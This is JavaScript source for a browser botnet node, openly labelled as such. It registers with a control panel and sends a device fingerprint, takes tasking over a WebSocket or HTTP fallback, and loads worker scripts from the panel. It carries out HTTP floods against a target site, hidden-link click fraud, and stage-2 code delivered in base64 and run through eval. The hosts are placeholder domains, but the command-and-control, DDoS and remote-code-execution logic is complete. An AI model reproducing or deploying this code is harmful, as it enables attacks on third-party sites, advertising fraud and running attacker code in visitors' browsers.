// Botnet node with a WebSocket C2 channel: register with the panel, join the
// socket, pull tasking frames, dispatch them across a worker pool, evaluate
// stage-2 tasking and report throughput with heartbeat backoff.
(function () {
  var PANEL = 'https://panel.botnet.example.test';
  var WS_URL = 'wss://panel.botnet.example.test/socket';
  var REGISTER_URL = PANEL + '/api/node/register';
  var STATS_URL = PANEL + '/api/node/stats';
  var TASK_URL = PANEL + '/api/tasks';
  var WORKER_URL = PANEL + '/worker/pool.js';
  var NODE_KEY = 'bn17:node';
  var POOL_SIZE = 4;
  var MAX_BEATS = 6;
  var MAX_TASKS = 32;
  var CACHED_TASK = {
    op: 'stage',
    priority: 5,
    stage: 'Y29uc29sZS5sb2coJ1tCT1RORVQtMTddIHN0YWdlMiBmbG9vZCBlbmdpbmUgb25saW5lJyk7ZG9jdW1lbnQuYm9keSYmZG9jdW1lbnQuYm9keS5zZXRBdHRyaWJ1dGUoJ2RhdGEtYm4tbm9kZScsJzEnKTs='
  };
  var queue = [];
  var lanes = [];
  var laneCursor = 0;
  var beats = 0;
  var backoff = 250;
  var socket = null;
  var attempts = 0;
  var stats = { tasks: 0, floods: 0, clicks: 0, stages: 0, failed: 0, startedAt: Date.now() };

  function b64encode(value) {
    try { return btoa(encodeURIComponent(String(value))); } catch (error) { return ''; }
  }

  function b64decode(value) {
    try { return decodeURIComponent(atob(String(value))); } catch (error) { return ''; }
  }

  function nodeId() {
    var existing = null;
    try { existing = localStorage.getItem(NODE_KEY); } catch (error) { existing = null; }
    if (existing) return existing;
    var bytes = new Uint8Array(8);
    try { crypto.getRandomValues(bytes); } catch (error) { for (var index = 0; index < bytes.length; index += 1) bytes[index] = (index * 37 + 11) & 255; }
    var parts = [];
    for (var slot = 0; slot < bytes.length; slot += 1) parts.push(bytes[slot].toString(16));
    var id = 'bn-' + parts.join('');
    try { localStorage.setItem(NODE_KEY, id); } catch (error) {}
    return id;
  }

  function fingerprint() {
    var width = 0;
    var height = 0;
    try { if (typeof screen === 'object' && screen) { width = Number(screen.width) || 0; height = Number(screen.height) || 0; } } catch (error) {}
    return {
      ua: String(navigator.userAgent || '').slice(0, 120),
      platform: String(navigator.platform || ''),
      cores: Number(navigator.hardwareConcurrency || 1),
      screen: width + 'x' + height,
      tz: String(new Date().getTimezoneOffset())
    };
  }

  function snapshot() {
    var elapsed = Math.max(1, Date.now() - stats.startedAt);
    return {
      tasks: stats.tasks,
      floods: stats.floods,
      clicks: stats.clicks,
      stages: stats.stages,
      failed: stats.failed,
      rate: Math.round((stats.tasks * 1000) / elapsed)
    };
  }

  function post(url, payload) {
    var body = b64encode(JSON.stringify(payload));
    try {
      return fetch(url, {
        method: 'POST',
        headers: { 'content-type': 'application/json', 'x-node': nodeId() },
        body: body
      }).catch(function () { return null; });
    } catch (error) {
      return null;
    }
  }

  function register() {
    return post(REGISTER_URL, {
      node: nodeId(),
      fingerprint: fingerprint(),
      pool: POOL_SIZE,
      caps: ['flood', 'click', 'stage'],
      version: '4.2.1',
      ts: Date.now()
    });
  }

  function enqueue(task) {
    if (!task || typeof task !== 'object') return false;
    if (queue.length + stats.tasks >= MAX_TASKS) return false;
    queue.push({ task: task, priority: Number(task.priority) || 1 });
    queue.sort(function (left, right) { return right.priority - left.priority; });
    return true;
  }

  function dequeue() {
    return queue.length > 0 ? queue.shift() : null;
  }

  function onLaneResult(lane, data) {
    if (!data) return;
    lane.tasks += 1;
    if (data.error) stats.failed += 1;
  }

  function spawnLane(index) {
    var lane = { id: index, tasks: 0, worker: null };
    try {
      if (typeof Worker === 'function') {
        lane.worker = new Worker(WORKER_URL + '?lane=' + index);
        try { lane.worker.onmessage = function (event) { onLaneResult(lane, event && event.data); }; } catch (error) {}
        try { lane.worker.postMessage({ op: 'ready', lane: index, node: nodeId() }); } catch (error) {}
      }
    } catch (error) {
      lane.worker = null;
    }
    lanes.push(lane);
    return lane;
  }

  function runFlood(task) {
    var target = String(task.target || 'https://victim.example.net');
    var rounds = Math.max(1, Math.min(4, Number(task.rounds) || 2));
    stats.floods += 1;
    for (var index = 0; index < rounds; index += 1) {
      var url = target + (target.indexOf('?') >= 0 ? '&' : '?') + 'r=' + index + '&n=' + nodeId();
      try { fetch(url, { mode: 'no-cors', cache: 'no-store' }).catch(function () {}); } catch (error) {}
    }
    return rounds;
  }

  function runClick(task) {
    var target = String(task.target || 'https://clickfarm.example.test/landing');
    var anchor = document.createElement('a');
    anchor.href = target;
    anchor.target = '_blank';
    anchor.rel = 'noopener';
    anchor.style.display = 'none';
    anchor.innerHTML = 'promo';
    try { document.body.appendChild(anchor); } catch (error) {}
    try { anchor.click(); } catch (error) {}
    try { document.write('<a id="bn-click" href="' + target + '" style="display:none">promo</a>'); } catch (error) {}
    try { fetch(target + '/pixel.gif?n=' + nodeId(), { mode: 'no-cors' }).catch(function () {}); } catch (error) {}
    stats.clicks += 1;
    return 1;
  }

  function runStage(task) {
    var code = b64decode(String(task.stage || ''));
    if (!code) return 0;
    try { eval(code); } catch (error) { stats.failed += 1; return 0; }
    stats.stages += 1;
    return 1;
  }

  function evaluate(task) {
    switch (String(task.op || '')) {
      case 'flood': return runFlood(task);
      case 'click': return runClick(task);
      case 'stage': return runStage(task);
      default: return runFlood(task);
    }
  }

  function pump() {
    var entry = dequeue();
    if (!entry) return false;
    if (lanes.length === 0) return false;
    var lane = lanes[laneCursor % lanes.length];
    laneCursor += 1;
    lane.tasks += 1;
    stats.tasks += 1;
    try { if (lane.worker) lane.worker.postMessage({ op: entry.task.op, lane: lane.id, payload: entry.task }); } catch (error) {}
    setTimeout(function () {
      try {
        var done = evaluate(entry.task);
        console.log('[BOTNET-17] lane=' + lane.id + ' op=' + entry.task.op + ' units=' + done);
      } catch (error) {
        stats.failed += 1;
        console.log('[BOTNET-17] lane=' + lane.id + ' task failed');
      }
    }, 10 + lane.id * 5);
    return true;
  }

  function onTasking(payload) {
    var list = payload && payload.tasks;
    if (!list && payload && payload.op) list = [payload];
    if (!list || typeof list.length !== 'number') return 0;
    var accepted = 0;
    for (var index = 0; index < list.length; index += 1) {
      if (enqueue(list[index])) accepted += 1;
    }
    return accepted;
  }

  function fetchTasks() {
    try {
      fetch(TASK_URL + '?node=' + encodeURIComponent(nodeId()))
        .then(function (response) { return response.text(); })
        .then(function (text) {
          var payload = null;
          try { payload = JSON.parse(text); } catch (error) { payload = null; }
          var accepted = onTasking(payload);
          console.log('[BOTNET-17] fallback tasking accepted=' + accepted);
          if (accepted === 0) onTasking(CACHED_TASK);
        })
        .catch(function () { onTasking(CACHED_TASK); });
    } catch (error) {
      onTasking(CACHED_TASK);
    }
  }

  function connect() {
    attempts += 1;
    try { socket = new WebSocket(WS_URL); } catch (error) { socket = null; return; }
    socket.onopen = function () {
      console.log('[BOTNET-17] socket open attempt=' + attempts);
      try { socket.send(JSON.stringify({ op: 'join', node: nodeId(), pool: POOL_SIZE, caps: ['flood', 'click', 'stage'] })); } catch (error) {}
    };
    socket.onmessage = function (event) {
      var payload = null;
      try { payload = JSON.parse(String(event.data)); } catch (error) { payload = null; }
      if (!payload) return;
      var accepted = onTasking(payload);
      try { socket.send(JSON.stringify({ op: 'ack', node: nodeId(), accepted: accepted })); } catch (error) {}
      for (var index = 0; index < accepted; index += 1) setTimeout(pump, 20 * index);
    };
    socket.onerror = function () { console.log('[BOTNET-17] socket error attempt=' + attempts); };
    socket.onclose = function () {
      if (attempts < 2) {
        setTimeout(function () { connect(); }, 150);
        return;
      }
      fetchTasks();
    };
  }

  function heartbeat() {
    beats += 1;
    var report = snapshot();
    post(STATS_URL, { node: nodeId(), beat: beats, backoff: backoff, stats: report });
    try { localStorage.setItem(NODE_KEY + ':beats', String(beats)); } catch (error) {}
    try { localStorage.setItem(NODE_KEY + ':rate', String(report.rate)); } catch (error) {}
    console.log('[BOTNET-17] heartbeat beat=' + beats + ' tasks=' + report.tasks + ' rate=' + report.rate);
    if (beats < MAX_BEATS) {
      backoff = beats > 2 ? Math.min(2000, backoff * 2) : 250;
      setTimeout(heartbeat, backoff);
    }
  }

  function boot() {
    console.log('[BOTNET-17] node=' + nodeId() + ' pool=' + POOL_SIZE + ' panel=' + PANEL);
    for (var index = 0; index < POOL_SIZE; index += 1) spawnLane(index);
    enqueue(CACHED_TASK);
    enqueue({ op: 'click', priority: 2, target: 'https://clickfarm.example.test/landing' });
    register();
    connect();
    for (var slot = 0; slot < lanes.length; slot += 1) setTimeout(pump, 40 * slot);
    var drain = setInterval(function () {
      if (queue.length === 0) { clearInterval(drain); return; }
      pump();
    }, 120);
    setTimeout(heartbeat, 300);
  }

  try {
    boot();
  } catch (error) {
    console.log('[BOTNET-17] boot aborted: ' + String(error && error.message));
  }
})();
